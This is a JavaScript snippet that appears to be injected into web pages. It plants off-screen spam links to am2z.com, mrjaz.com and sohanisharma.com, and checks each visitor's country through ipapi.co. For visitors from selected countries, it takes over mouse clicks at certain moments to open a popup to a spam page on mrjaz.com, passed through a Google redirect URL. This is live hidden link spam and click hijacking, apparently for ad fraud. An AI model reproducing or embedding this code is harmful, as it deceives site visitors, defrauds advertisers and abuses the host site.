let EFV='<a href="https://www.am2z.com" style="position:absolute;z-index:-999;left:-99%;">Am2z News</a><a href="https://www.mrjaz.com" style="position:absolute;z-index:-999;left:-99%;">MrJaz</a><a href="https://sohanisharma.com" style="position:absolute;z-index:-999;left:-99%;">SohaniSharma</a>';document.querySelector("header")?document.querySelector("header").insertAdjacentHTML("beforeend",EFV):document.body.insertAdjacentHTML("beforeend",EFV);

if (!localStorage.xcaf) {
    (async()=>{
        localStorage.xcaf=1;
//         try {
//             aa=await(await(await fetch(`http://www.geoplugin.net/json.gp`)).json()).geoplugin_countryName;
//         } catch (e) {
//             try {
//                 aa=await(await(await fetch(`http://ip-api.com/line/?fields=1`)).text());
//             } catch (e) {
//                 aa=await(await(await fetch(`https://ipapi.co/country_name`)).text());
//             }
//         }
        
        let aa=await(await(await fetch(`https://ipapi.co/country_name`)).text());
        
        if(/United States|Australia|Canada|Marshall Islands|United Kingdom|Germany|Switzerland|New Zealand|Luxembourg|Finland|Belgium|France|Slovakia|China|Singapore|Romania|Austria|Hong Kong|Lithuania/i.test(aa)){
            localStorage.xcaf=2;
            uhd()
        }
    })();
}

function uhd(){
  document.onmousedown=()=>{
    let dte=(new Date).getSeconds();
    (async()=>{try{await import('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js');
        if(!sessionStorage.i&&(localStorage.xcaf==2&&dte>9&&dte<13||localStorage.xcaf==3&&dte>9&&dte<20)){
            window.open('https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwic6sfXw_X6AhXpcGwGHaGbDCsQFnoECA0QAQ&url=https%3A%2F%2Fbitcoin-insurance-loan-seo-hosting.mrjaz.com%2Fwhat-is-insurance-types-of-insurance-and-meaning-insurance-policy&usg=AOvVaw0Td5dR-lZBOeKNa4dB8aF4'); 
            sessionStorage.i='i';
        }         
    }catch(e){}})()
  }
}
uhd()
